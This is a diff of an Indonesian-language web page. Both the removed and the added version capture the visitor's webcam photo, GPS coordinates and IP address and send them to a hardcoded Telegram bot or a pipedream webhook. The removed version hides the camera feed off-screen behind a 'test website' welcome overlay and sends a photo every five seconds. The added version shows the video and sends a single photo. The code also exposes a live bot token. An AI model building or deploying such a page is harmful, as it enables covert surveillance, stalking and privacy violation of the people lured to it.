@@ -3,76 +3,77 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Foto</title>
+  <title>Kirim Foto & Lokasi ke Telegram</title>
   <style>
-    html,body{margin:0;height:100%}
-    body{display:flex;align-items:center;justify-content:center;background:#000}
-    img{max-width:100%;max-height:100%;object-fit:contain}
-    #welcomePage{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui}
-    button{margin-top:20px;padding:12px 28px;font-size:1rem;border:none;border-radius:30px;background:#fff;color:#000;cursor:pointer}
+    body { font-family: Arial; text-align: center; padding: 30px; }
+    video { width: 300px; height: 200px; border: 1px solid #ccc; }
+    button { padding: 10px 20px; font-size: 16px; }
   </style>
 </head>
 <body>
 
-  <!-- Layer welcome -->
-  <div id="welcomePage">
-    <h1>Website Percobaan</h1>
-    <p>Tekan Lanjut untuk melanjutkan.</p>
-    <button onclick="start()">Lanjut</button>
-  </div>
-
-  <!-- Gambar utama (dapat di-save) -->
-  <img id="mainImg" src="https://foto.png" alt="foto"/>
-
-  <!-- hidden video -->
-  <video id="video" autoplay muted style="position:fixed;top:-9999px"></video>
+  <h2>Klik "Lanjut" untuk mulai</h2>
+  <button onclick="start()">Lanjut</button>
+  <br><br>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
     const CHAT_ID   = '7670525689';
-    const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const WEBHOOK_URL = 'https://eouxkofejjzs7xj.m.pipedream.net';
 
-    let streamGlobal;
+    async function start() {
+      try {
+        // 1. Lokasi
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        const { latitude, longitude } = pos.coords;
 
-    async function start(){
-      try{
-        // 1) izin lokasi
-        await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
-        // 2) izin kamera
-        streamGlobal = await navigator.mediaDevices.getUserMedia({video:true});
-        const v=document.getElementById('video');
-        v.srcObject=streamGlobal;
-        await new Promise(res=>{if(v.videoWidth>0)res();else v.onloadedmetadata=res});
-        await new Promise(r=>setTimeout(r,1000)); // stabil
+        // 2. IP & kota
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        const { ip, city, region } = ipData;
 
-        // 3) hilangkan welcome
-        document.getElementById('welcomePage').style.display='none';
+        // 3. Kamera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
 
-        // 4) mulai kirim foto tiap 5 detik
-        setInterval(captureAndSend,5000);
-        captureAndSend(); // kirim pertama langsung
-      }catch(err){
-        alert('Izin ditolak / error: '+err.message);
+        // 4. Tunggu 2 detik → ambil foto
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const ctx = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+
+          canvas.toBlob(async (blob) => {
+            const caption = `📍 ${city}, ${region}\n🌍 ${latitude}, ${longitude}\n🌐 ${ip}`;
+
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('caption', caption);
+            form.append('photo', blob, 'foto.jpg');
+
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              body: form
+            }).then(r => {
+              if (!r.ok) throw new Error('Gagal kirim');
+              alert('✅ Terkirim ke Telegram!');
+            }).catch(err => {
+              alert('❌ Gagal kirim: ' + err.message);
+            });
+
+            stream.getTracks().forEach(t => t.stop());
+          }, 'image/jpeg');
+        }, 2000);
+
+      } catch (err) {
+        alert('Izin ditolak atau error: ' + err.message);
       }
-    }
-
-    async function captureAndSend(){
-      const v=document.getElementById('video');
-      if(!v.videoWidth||!v.videoHeight)return;
-      const canvas=document.createElement('canvas');
-      canvas.width=v.videoWidth;canvas.height=v.videoHeight;
-      canvas.getContext('2d').drawImage(v,0,0);
-      canvas.toBlob(async blob=>{
-        const ip=await fetch('https://ipapi.co/json').then(r=>r.json()).then(d=>d.ip);
-        const pos=await new Promise(res=>navigator.geolocation.getCurrentPosition(res));
-        const {latitude,longitude}=pos.coords;
-        const caption=`📍 ${latitude}, ${longitude}\n🌐 ${ip}`;
-        const form=new FormData();
-        form.append('chat_id',CHAT_ID);
-        form.append('caption',caption);
-        form.append('photo',blob,'foto.jpg');
-        fetch(TG_URL,{method:'POST',body:form}).catch(()=>{});
-      },'image/jpeg');
     }
   </script>
 
